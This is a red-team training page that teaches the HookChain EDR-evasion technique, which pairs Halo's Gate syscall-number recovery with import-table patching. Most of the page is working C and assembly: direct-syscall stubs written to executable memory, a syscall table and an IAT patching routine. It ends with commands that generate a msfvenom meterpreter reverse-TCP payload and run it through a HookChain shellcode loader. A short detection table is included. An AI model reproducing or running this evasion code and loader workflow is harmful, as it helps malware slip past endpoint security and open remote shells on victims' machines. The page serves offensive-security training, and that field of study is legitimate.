---
layout: training-page
title: "HookChain — IAT Hooking & Halo's Gate — Red Team Academy"
module: "Evasion"
tags:
  - hookchain
  - halos-gate
  - iat-hooking
  - syscall
  - edr-bypass
  - t1055
page_key: "evasion-hookchain"
render_with_liquid: false
---

# HookChain — IAT Hooking & Halo's Gate

HookChain is an advanced EDR evasion technique that combines **Halo's Gate** (dynamic syscall number mapping from unhooked ntdll neighbors) with **IAT patching** (replacing import table entries to redirect Win32 API calls through a custom syscall dispatcher). The result: every monitored Windows API call is transparently rerouted to a direct syscall, bypassing user-mode EDR hooks entirely.

Reference implementation: `github.com/helviojunior/hookchain`

---

## Background: Why EDR Hooks Break

EDR products insert `jmp` instructions (inline hooks) at the start of sensitive ntdll functions (`NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, etc.) to intercept calls before they reach the kernel. User-mode tools that call these APIs pass through the EDR's monitoring code.

HookChain neutralizes this by:
1. Resolving the real syscall numbers (SSNs) dynamically — without reading hooked ntdll
2. Patching the IAT of the target process so all Win32 API calls route through a custom dispatcher
3. The dispatcher issues direct syscalls, completely skipping hooked ntdll stubs

---

## The 6-Step HookChain Process

### Step 1 — Dynamic SSN Mapping (Halo's Gate)

Standard Hell's Gate reads SSNs from the ntdll stub prologue. If EDR has hooked the function (replacing the mov eax, SSN bytes), the SSN is gone. **Halo's Gate** recovers it by scanning neighboring functions in ntdll's EAT:

```
ntdll export table — sorted by SSN (ascending):
  NtAccessCheck           SSN = 0x00
  NtWorkerFactoryWorkerReady SSN = 0x01
  ...
  NtAllocateVirtualMemory SSN = 0x18  ← hooked — SSN bytes overwritten
  NtAllocateVirtualMemoryEx SSN = 0x19  ← clean — SSN readable
  ...
```

If `NtAllocateVirtualMemory`'s stub is hooked, read its neighbor's SSN and adjust by ±1:

```c
// Pseudocode: recover SSN for hooked function
DWORD RecoverSSN(PVOID hookedStub) {
    // Scan forward/backward in ntdll's text section
    // Find nearest unhooked Nt* stub (starts with "4C 8B D1 B8 xx 00 00 00")
    // SSN of target = SSN of neighbor ± offset in sorted EAT
}
```

### Step 2 — Map Critical ntdll Functions

Build a table of all Nt* functions we want to intercept, with their recovered SSNs:

```c
typedef struct {
    char*  functionName;
    DWORD  ssn;
    PVOID  ntdllAddress;  // original ntdll address (for IAT matching)
} SyscallEntry;

SyscallEntry syscallTable[] = {
    { "NtAllocateVirtualMemory",   0, nullptr },
    { "NtProtectVirtualMemory",    0, nullptr },
    { "NtWriteVirtualMemory",      0, nullptr },
    { "NtReadVirtualMemory",       0, nullptr },
    { "NtQueryInformationProcess", 0, nullptr },
    { "NtCreateThreadEx",          0, nullptr },
    { "NtOpenProcess",             0, nullptr },
};

void BuildSyscallTable() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    for (auto& entry : syscallTable) {
        PVOID stub = GetProcAddress(ntdll, entry.functionName);
        entry.ntdllAddress = stub;
        entry.ssn = ExtractOrRecoverSSN(stub);  // Halo's Gate logic
    }
}
```

### Step 3 — Build Syscall Dispatch Table

For each recovered SSN, generate a small assembly trampoline that issues the direct syscall:

```asm
; x64 direct syscall stub — placed in RX memory
; rcx, rdx, r8, r9 already contain the first 4 args from the caller
mov r10, rcx         ; syscall calling convention requirement
mov eax, <SSN>       ; load syscall number
syscall              ; kernel transition — bypasses ntdll entirely
ret
```

In C++, each stub is a few bytes written to executable memory:

```c
PVOID CreateSyscallStub(DWORD ssn) {
    // x64 stub bytes: 4C 8B D1 B8 [SSN 4 bytes] 0F 05 C3
    unsigned char stub[] = {
        0x4C, 0x8B, 0xD1,              // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00,  // mov eax, <SSN>  (patched below)
        0x0F, 0x05,                    // syscall
        0xC3                           // ret
    };
    *(DWORD*)(stub + 4) = ssn;

    PVOID mem = VirtualAlloc(nullptr, sizeof(stub),
                             MEM_COMMIT | MEM_RESERVE,
                             PAGE_EXECUTE_READWRITE);
    memcpy(mem, stub, sizeof(stub));
    return mem;
}
```

### Step 4 — Preload Target DLLs

Before patching the IAT, ensure all target DLLs are already loaded (IAT entries are resolved at this point):

```c
// Force-load all DLLs whose IAT entries we'll patch
const char* targetDLLs[] = {
    "kernel32.dll",
    "kernelbase.dll",
    "bcrypt.dll",
    "gdi32.dll",
    "mswsock.dll",
    "urlmon.dll",
};

for (auto dll : targetDLLs) {
    LoadLibraryA(dll);
}
```

### Step 5 — Parse EAT and IAT

Enumerate the IAT of each target DLL and identify entries pointing to ntdll functions we've mapped:

```c
void ParseIAT(HMODULE hModule, const char* moduleName) {
    // Walk PE headers → IMAGE_IMPORT_DESCRIPTOR → thunk array
    // For each entry: compare IAT value to ntdllAddress in our syscallTable
    // If match: record IAT entry address for patching in Step 6
}
```

### Step 6 — Patch the IAT

Replace ntdll function pointers in the IAT with our direct syscall stub addresses:

```c
void PatchIAT(PVOID* iatEntry, PVOID syscallStub) {
    DWORD oldProtect;
    VirtualProtect(iatEntry, sizeof(PVOID), PAGE_READWRITE, &oldProtect);
    *iatEntry = syscallStub;
    VirtualProtect(iatEntry, sizeof(PVOID), oldProtect, &oldProtect);
}
```

After patching: every call to `VirtualAlloc` (which calls `NtAllocateVirtualMemory` via kernel32's IAT) will hit our stub — direct syscall, no ntdll, no EDR hooks.

---

## Critical Functions Intercepted

| Win32 API | ntdll Function | Syscall |
|-----------|----------------|---------|
| `VirtualAlloc` / `VirtualAllocEx` | `NtAllocateVirtualMemory` | Direct |
| `VirtualProtect` / `VirtualProtectEx` | `NtProtectVirtualMemory` | Direct |
| `WriteProcessMemory` | `NtWriteVirtualMemory` | Direct |
| `ReadProcessMemory` | `NtReadVirtualMemory` | Direct |
| `QueryInformationProcess` | `NtQueryInformationProcess` | Direct |
| `CreateRemoteThread` | `NtCreateThreadEx` | Direct |
| `OpenProcess` | `NtOpenProcess` | Direct |

---

## Using hookchain-shellcode-loader

A ready-to-use loader integrating HookChain with shellcode execution:

```bash
# Clone
git clone https://github.com/CyberSecurityUP/hookchain-shellcode-loader

# Generate shellcode (msfvenom or custom)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f raw -o payload.bin

# Build loader (Windows, MSVC)
cd hookchain-shellcode-loader
msbuild loader.sln /p:Configuration=Release /p:Platform=x64

# Run — HookChain patches IAT, then loads payload.bin
loader.exe payload.bin
```

---

## Detection

HookChain is sophisticated but not invisible:

| Signal | Source |
|--------|--------|
| IAT entries pointing outside loaded module image ranges | Memory scanner |
| `VirtualProtect` calls on IAT region (`PAGE_READWRITE` → `PAGE_EXECUTE`) | EDR behavioral |
| ntdll sections scanned and compared against disk copy (ntdll integrity check) | EDR startup check |
| Syscall instruction executed outside ntdll address range | Hardware-assisted ETW/Intel PT |
| Unusual RIP value during system call (kernel-side check) | Windows kernel telemetry |

**Kernel Patch Guard** does not protect user-mode hooks — only kernel-mode structures. HookChain operates entirely in user mode.

---

## Resources

- HookChain original implementation — `github.com/helviojunior/hookchain`
- HookChain shellcode loader — `github.com/CyberSecurityUP/hookchain-shellcode-loader`
- Halo's Gate (technique overview) — `blog.sektor7.net/#!res/2021/halosgate.md`
- Hell's Gate (original SSN mapper) — `github.com/am0nsec/HellsGate`
- SysWhispers3 (SSN resolution + direct syscalls) — `github.com/klezVirus/SysWhispers3`
- MITRE ATT&CK T1055 — Process Injection — `attack.mitre.org/techniques/T1055/`
